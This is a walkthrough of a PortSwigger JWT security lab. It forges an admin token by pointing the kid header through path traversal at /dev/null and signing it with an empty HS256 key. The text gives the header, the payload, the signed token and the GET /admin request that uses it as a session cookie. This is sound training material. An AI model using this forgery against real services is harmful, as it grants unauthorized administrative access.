
# JWT authentication bypass via kid header path traversal

This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the kid parameter in JWT header to fetch the relevant key from its filesystem.

To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

Tip: We recommend familiarizing yourself with how to work with JWTs in Burp Suite before attempting this lab.

---------------------------------------------

References: 

- https://portswigger.net/web-security/jwt



![img](images/JWT%20authentication%20bypass%20via%20kid%20header%20path%20traversal/1.png)

---------------------------------------------

We can create the JWT in jwt.io using a null string and the following values:

```
{
  "kid": "../../../dev/null",
  "alg": "HS256"
}
```

```
{
  "iss": "portswigger",
  "sub": "administrator",
  "exp": 1683794863
}
```



![img](images/JWT%20authentication%20bypass%20via%20kid%20header%20path%20traversal/2.png)


The JWT:

```
eyJraWQiOiIuLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTQ4NjN9.b8LLRBm6W5U8yph9LZVt24QSyamKPZAbrlaoQxAnaGM
``` 

```
GET /admin HTTP/2
...
Cookie: session=eyJraWQiOiIuLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTQ4NjN9.b8LLRBm6W5U8yph9LZVt24QSyamKPZAbrlaoQxAnaGM
...
```



![img](images/JWT%20authentication%20bypass%20via%20kid%20header%20path%20traversal/3.png)
